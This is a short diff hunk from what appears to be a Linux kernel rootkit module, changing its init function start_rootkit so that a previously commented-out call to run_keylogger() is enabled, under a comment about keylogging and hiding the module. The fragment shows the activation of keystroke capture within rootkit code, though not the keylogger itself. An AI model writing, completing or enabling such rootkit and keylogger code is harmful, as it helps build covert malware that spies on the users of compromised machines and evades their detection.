@@ -26,7 +26,7 @@ static int __init start_rootkit(void)
 
 
     //KEYLOGGER AND HIDE THE MODULE
-    //ret = run_keylogger();
+    ret = run_keylogger();
     if (ret ==-1)
     {
         printk(KERN_ALERT "rk: keylogger could not load!");
